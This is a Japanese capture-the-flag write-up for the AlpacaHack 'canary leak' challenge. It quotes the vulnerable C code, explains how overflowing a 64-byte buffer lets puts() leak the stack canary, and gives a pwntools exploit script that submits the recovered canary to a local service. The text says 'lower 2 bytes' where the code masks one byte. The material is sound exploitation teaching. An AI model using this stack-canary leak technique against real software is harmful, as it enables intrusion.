# ■ canary-leak
[canary leak - AlpacaHack](https://alpacahack.com/challenges/canary-leak)

# 1. Writeup
## 1.0. `chall.c`

`chall.c`:
```C
...
 6	
 7	void vuln(){
 8	    unsigned long *canary;
 9	    unsigned long canary_saved;
10	    unsigned long input;
11	    char buf[64];
12	
13	    canary = (unsigned long *)(buf + 0xc8);
14	    canary_saved = *canary;
15	
16	    puts("Input:");
17	    read(0, buf, 0xcf);
18	    
19	    puts("Output:");
20	    puts(buf);
21	
22	    puts("Canary?");
23	    read(0, &input, 8);
24	
25	    if(canary_saved == input){
26	        FILE *fp = fopen("flag.txt","r");
27	            char flag[128];
28	            fgets(flag, sizeof(flag), fp);
29	            puts(flag);
30	    }else{
31	        puts("Nope");
32	    }
33	}
...
```

## 1.1. Stack Buffer Overlow
```C
17	    read(0, buf, 0xcf);
```

`buf[64]` に対し, サイズ `0xcf(207)` で `read()` しているのでStack Buffer Overflowできる.

## 1.2. canary

```C
13	    canary = (unsigned long *)(buf + 0xc8);
14	    canary_saved = *canary;
```

`canary` は `buf+0xc8(200)` に在る.

また, canaryは最下位byteが `0x00` となる.

## 1.3. `puts()` のしくみ

```C
19	    puts("Output:");
20	    puts(buf);
```

`puts()` はNULL終端(`\x00`)までを文字列として解釈して出力する.

## 1.4. 方針
`read(0, buf, 0xcf)` で `buf` からStack Buffer Overflowを起こし, `canary` の下位2byteを書き換える. したがって `puts(buf)` によって `canary` をリークできる.

例えば `Input` で `b'A'*0xc9(201)` を渡した場合,

```
buf       ...         canary                                   ...
[0..63]   [64..200]   [200..208]                               ...
0x41 0x41      ...    0x41 0x?? 0x?? 0x?? 0x?? 0x?? 0x?? 0x??  ... 0x00
```

となり, `puts(buf)` で `canary` を含んだ文字列(バイト列(`0x??????????????41`))をリークできる.

これによって得られる `canary` は下位2byteが `0x00` ではないため, これを修正して提示すればよい.

## 1.5. exploit

`solve.py`
```python
from pwn import *

context.binary = './chall'

_, HOST, PORT = 'nc localhost 9999'.split()
io = remote(HOST, PORT)

# Send padding
io.sendafter(b'Input:\n', b'A'*0xc9)
io.recvuntil(b'A'*0xc8)

# Leak canary
canary = u64(io.recvline().strip()[:8]) # Get 8 bytes
log.info(f'Output: {hex(canary)}')

# Modify leaked canary
canary = canary & 0xffffffffffffff00 # The lower 2 bytes are 0x00.
log.info(f'Canary: {hex(canary)}')

# Send got canary
io.sendafter(b'Canary?\n', p64(canary))

flag = io.recvregex(b'Alpaca{.+}').decode()
print(f'[+] {flag}')
```

- バイト列のやり取りの際, エンディアンに気をつける.
